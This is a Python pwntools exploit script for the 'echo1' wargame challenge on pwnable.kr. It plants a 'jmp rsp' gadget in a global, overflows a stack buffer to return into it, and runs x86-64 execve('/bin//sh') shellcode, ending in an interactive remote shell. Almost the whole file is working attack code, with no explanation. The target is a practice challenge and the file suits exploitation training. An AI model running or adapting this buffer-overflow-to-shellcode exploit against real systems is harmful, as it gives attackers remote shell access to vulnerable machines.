#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = ELF("./echo1")
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process("./echo1")
    libc = elf.libc


else:
    io = remote("pwnable.kr", 9010)
    #  libc = ELF("")


def DEBUG(cmd = ""):
    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    io.sendlineafter(" : ", asm("jmp rsp"))
    #  DEBUG("b *echo1\nc")
    io.sendlineafter("> ", "1")
    sc = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
    payload = fit({0x20 + 8: [elf.sym['id'], sc]})
    io.sendline(payload)
    
    io.interactive()
    io.close()



